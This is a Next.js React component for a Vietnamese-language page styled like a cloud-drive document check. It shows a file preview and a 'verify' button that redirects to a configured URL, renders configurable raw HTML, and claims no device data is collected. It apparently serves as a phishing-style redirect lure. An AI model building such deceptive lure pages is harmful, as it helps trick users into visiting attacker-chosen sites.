'use client';

import React from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { Loader2, FileText, UserCheck } from 'lucide-react';
import type { VerificationConfig } from '@/app/actions/settings';
import { Button } from '@/components/ui/button';
import { useSimpleRedirect } from '@/hooks/use-simple-redirect';

interface DriveVerificationClientProps {
  config: VerificationConfig;
}

export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
  const { status, isRedirecting, startRedirect } = useSimpleRedirect({
    redirectUrl: config.redirectUrl,
    fallbackUrl: config.imageUrl,
  });

  return (
    <div className="flex justify-center items-center min-h-screen bg-cover bg-center p-4" style={{backgroundImage: "url('https://images.unsplash.com/photo-1554141316-1f7f5a934143?q=80&w=2574&auto=format&fit=crop')"}}>
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
      <Card aria-busy={isRedirecting} className="z-10 p-6 sm:p-8 rounded-xl shadow-2xl text-center max-w-lg w-full bg-card/80 backdrop-blur-lg border border-white/20">
        <CardContent className="p-0 flex flex-col items-center">

          <div className="w-full bg-muted/30 rounded-lg p-4 mb-6 border border-white/10">
            <div className="flex items-center gap-4 mb-4 text-left">
                 <div className="bg-primary/10 p-3 rounded-lg border border-primary/20">
                    <FileText className="h-6 w-6 text-primary" />
                 </div>
                 <div>
                    <p className="font-bold text-lg text-foreground leading-tight">{config.fileName}</p>
                    <p className="text-sm text-muted-foreground">{config.fileInfo}</p>
                 </div>
            </div>
            <div className="aspect-[16/10] w-full rounded-md bg-background flex items-center justify-center overflow-hidden shadow-inner">
                <Image
                    src={config.imageUrl}
                    alt="File preview"
                    width={800}
                    height={500}
                    className="object-cover w-full h-full"
                    data-ai-hint="document paper"
                    priority
                />
            </div>
          </div>
          
          {isRedirecting ? (
            <>
              <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
              <p className="text-muted-foreground text-sm leading-normal mb-8">
                Chúng tôi sẽ mở tài liệu ngay sau khi bạn xác nhận. Không thu thập vị trí hoặc thông tin thiết bị.
              </p>

              <div className="w-full flex flex-col items-center justify-center gap-4 h-24">
                <Loader2 className="h-10 w-10 text-primary animate-spin" />
                <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
              </div>
            </>
          ) : (
            <>
              <h1 className="text-2xl font-bold mb-2 text-foreground">Xác minh</h1>
              <p className="text-muted-foreground text-sm leading-normal mb-8">
                Nhấn nút bên dưới để tiếp tục mở tài liệu.
              </p>
              
              {config.customHtml && (
                <div
                    className="custom-html-block w-full text-left text-sm text-muted-foreground mb-6"
                    dangerouslySetInnerHTML={{ __html: config.customHtml }}
                />
              )}

              <Button onClick={startRedirect} disabled={isRedirecting} size="lg" className="w-full h-16 text-lg font-bold">
                 <UserCheck className="mr-3 h-6 w-6" />
                 Tiếp tục
              </Button>
            </>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
